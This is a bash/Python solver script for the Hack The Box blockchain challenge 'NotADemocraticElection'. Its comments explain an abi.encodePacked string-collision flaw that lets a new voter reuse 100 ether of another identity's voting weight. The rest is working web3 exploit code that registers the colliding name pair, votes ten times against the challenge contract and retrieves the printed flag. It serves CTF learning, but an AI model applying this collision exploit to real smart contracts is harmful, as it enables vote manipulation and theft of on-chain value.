#!/usr/bin/env bash

set -euo pipefail

# Challenge: NotADemocraticElection
# Platform: Hack The Box
# Category: Blockchain
#
# Full scenario:
# In the post-apocalyptic wasteland, the remnants of human and machine
# factions vie for control over the last vestiges of civilization. The
# Automata Liberation Front (ALF) and the Cyborgs Independence Movement (CIM)
# are the two primary parties seeking to establish dominance. In this harsh
# and desolate world, democracy has taken a backseat, and power is conveyed by
# wealth. Will you be able to bring back some Democracy in this hopeless land?
#
# Provided files:
#   - blockchain_notademocraticelection.zip
#   - blockchain_notademocraticelection/Setup.sol
#   - blockchain_notademocraticelection/NotADemocraticElection.sol
#
# Vulnerability:
# The voter signature is derived with:
#   abi.encodePacked(_name, _surname)
#
# That is ambiguous for dynamic strings, so different (name, surname) pairs can
# collide. The setup registers:
#   ("Satoshi", "Nakamoto")
#
# We can register:
#   ("SatoshiN", "akamoto")
#
# Both concatenate to the same byte string:
#   "SatoshiNakamoto"
#
# The setup deposited 100 ether of voting weight for the original name pair.
# By registering the colliding pair under our own address, we can vote with
# that same 100 ether weight. Since the contract also does not prevent repeated
# voting, ten votes are enough to push CIM to the target threshold.
#
# Final flag obtained during testing:
#   HTB{h4sh_c0ll1s10n_t0_br1ng_b4ck_d3m0cr4cy}

VENV_PY="/home/eliah/Desktop/CTF/HackTheBox/NotADemocraticElection/.venv/bin/python"

"$VENV_PY" - <<'PY'
import socket
from web3 import Web3

MENU_HOST = "154.57.164.66"
MENU_PORT = 31535
RPC_URL = "http://154.57.164.66:31631/"

with socket.create_connection((MENU_HOST, MENU_PORT), timeout=5) as s:
    s.settimeout(3)
    data = b""
    while b"action?" not in data:
        data += s.recv(4096)
    s.sendall(b"1\n")
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except Exception:
        pass

info = out.decode("latin-1", errors="ignore").splitlines()
values = {}
for line in info:
    if ":" in line:
        k, v = line.split(":", 1)
        values[k.strip()] = v.strip()

private_key = values["Private key"]
player_address = values["Address"]
target_address = values["Target contract"]
setup_address = values["Setup contract"]

w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(private_key)
assert account.address.lower() == player_address.lower()

challenge_abi = [
    {
        "inputs": [
            {"internalType": "string", "name": "_name", "type": "string"},
            {"internalType": "string", "name": "_surname", "type": "string"},
        ],
        "name": "depositVoteCollateral",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function",
    },
    {
        "inputs": [
            {"internalType": "bytes3", "name": "_party", "type": "bytes3"},
            {"internalType": "string", "name": "_name", "type": "string"},
            {"internalType": "string", "name": "_surname", "type": "string"},
        ],
        "name": "vote",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [{"internalType": "bytes3", "name": "_party", "type": "bytes3"}],
        "name": "getVotesCount",
        "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "winner",
        "outputs": [{"internalType": "bytes3", "name": "", "type": "bytes3"}],
        "stateMutability": "view",
        "type": "function",
    },
]

setup_abi = [
    {
        "inputs": [],
        "name": "isSolved",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    }
]

challenge = w3.eth.contract(address=Web3.to_checksum_address(target_address), abi=challenge_abi)
setup = w3.eth.contract(address=Web3.to_checksum_address(setup_address), abi=setup_abi)

name = "SatoshiN"
surname = "akamoto"
nonce = w3.eth.get_transaction_count(account.address)

base_tx = {
    "from": account.address,
    "chainId": w3.eth.chain_id,
    "gasPrice": w3.eth.gas_price,
}

def send_transaction(tx):
    signed = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    return w3.eth.wait_for_transaction_receipt(tx_hash)

receipt = send_transaction(
    challenge.functions.depositVoteCollateral(name, surname).build_transaction(
        {**base_tx, "nonce": nonce, "value": 0, "gas": 200000}
    )
)
if receipt.status != 1:
    raise SystemExit("[-] depositVoteCollateral failed")
nonce += 1

for _ in range(10):
    receipt = send_transaction(
        challenge.functions.vote(b"CIM", name, surname).build_transaction(
            {**base_tx, "nonce": nonce, "gas": 200000}
        )
    )
    if receipt.status != 1:
        raise SystemExit("[-] vote failed")
    nonce += 1

if not setup.functions.isSolved().call():
    raise SystemExit("[-] Challenge is not solved after voting.")

with socket.create_connection((MENU_HOST, MENU_PORT), timeout=5) as s:
    s.settimeout(3)
    data = b""
    while b"action?" not in data:
        data += s.recv(4096)
    s.sendall(b"3\n")
    out = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except Exception:
        pass

text = out.decode("latin-1", errors="ignore")
marker = "HTB{"
if marker not in text:
    raise SystemExit("[-] Flag not found in launcher response.")

start = text.index(marker)
end = text.find("}", start)
if end == -1:
    raise SystemExit("[-] Flag start found, but closing brace missing.")

print(text[start:end + 1])
PY
